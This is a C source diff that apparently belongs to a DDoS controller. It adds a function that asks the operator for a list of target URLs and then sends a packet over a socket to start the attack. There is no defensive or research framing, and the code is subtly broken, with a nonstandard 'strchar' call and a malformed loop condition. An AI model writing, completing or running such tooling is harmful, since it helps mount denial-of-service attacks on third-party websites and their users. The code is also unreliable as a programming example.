@@ -32,5 +32,23 @@ uint8_t input() {
 void ddos_input(SOCKET sock) {
     char urls[4098];
 
-    printf("[!]")
+    printf("\033[33m[!] Now you need to enter an array of urls to which you want to send a DDoS attack. Format: ['https://example.com'] or ['https://example.com', 'https://example.com']\033[0m\n");
+
+    do {
+        fgets(urls, sizeof(urls), stdin);
+
+        size_t len = strlen(urls);
+        if (len > 0 && urls[len - 1] == '\n') {
+            urls[len - 1] = '\0';
+        }
+
+        if (strchar(urls, '[') == NULL || strchar(urls, ']') == NULL) {
+            printf("\033[33m[!] String format error!\033[0m\n");
+        }
+    } while (urls != NULL && strchar(urls, '[') != NULL || strchar(urls, ']') != NULL);
+
+    printf("Sending a packet at the beginning of a DDoS attack...\n");
+    if (ddos_packet(sock, NULL) < 0) {
+        printf("Failed to command ddos send packet\n");
+    }
 }
